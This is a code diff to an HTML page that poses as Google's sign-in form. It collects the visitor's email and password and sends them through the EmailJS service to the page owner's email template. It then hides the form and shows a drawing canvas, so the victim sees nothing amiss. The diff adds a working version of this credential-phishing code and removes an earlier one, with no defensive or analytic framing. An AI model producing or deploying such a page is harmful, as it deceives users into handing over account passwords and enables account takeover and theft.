@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Login</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -49,43 +50,73 @@
         .login-container button:hover {
             background-color: #357ae8;
         }
+        canvas {
+            border: 1px solid #000;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Sign in to Google</h2>
-        <form id="loginForm">
-            <input type="email" id="email" placeholder="Email or phone" required>
-            <input type="password" id="password" placeholder="Enter your password" required>
-            <button type="submit">Next</button>
-        </form>
-    </div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        emailjs.init("Wm_hgPysMxjkcdYas"); // Initialize EmailJS with your user ID
+<div class="login-container">
+    <h2>Sign in to Google</h2>
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button type="submit">Next</button>
+    </form>
+</div>
 
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+<canvas id="drawingCanvas" width="400" height="400" style="display: none;"></canvas>
 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+<script>
+    // Initialize EmailJS
+    emailjs.init("user_Wm_hgPysMxjkcdYas");  // Replace with your EmailJS User ID
 
-            const data = {
-                email: email,       // Matches {{email}} in the EmailJS template
-                password: password  // Matches {{password}} in the EmailJS template
-            };
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
 
-            emailjs.sendForm("service_zrgq0cs", "template_8r7y8vw", data)
-                .then(function(response) {
-                    console.log("Success:", response);
-                    // Redirect to the drawing page after successful submission
-                    window.location.href = "drawingPage.html"; // Replace with your actual drawing page URL
-                }, function(error) {
-                    console.log("Error:", error);
-                    alert("Failed to send the form. Please try again.");
-                });
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Send the form data to your email
+        emailjs.send("service_zrgq0cs", "template_8r7y8vw", {
+            email: email,
+            password: password
+        }).then(function(response) {
+            console.log("Success:", response);
+            
+            // Hide the login form and show the drawing canvas
+            document.querySelector('.login-container').style.display = 'none';
+            document.getElementById('drawingCanvas').style.display = 'block';
+
+            // Initialize drawing functionality
+            const canvas = document.getElementById('drawingCanvas');
+            const ctx = canvas.getContext('2d');
+            let drawing = false;
+
+            canvas.addEventListener('mousedown', function() {
+                drawing = true;
+            });
+
+            canvas.addEventListener('mouseup', function() {
+                drawing = false;
+                ctx.beginPath(); // Stop drawing when mouse is released
+            });
+
+            canvas.addEventListener('mousemove', function(event) {
+                if (drawing) {
+                    const x = event.offsetX;
+                    const y = event.offsetY;
+                    ctx.lineTo(x, y);
+                    ctx.stroke();
+                }
+            });
+        }, function(error) {
+            console.log("Failed to send:", error);
         });
-    </script>
+    });
+</script>
+
 </body>
 </html>
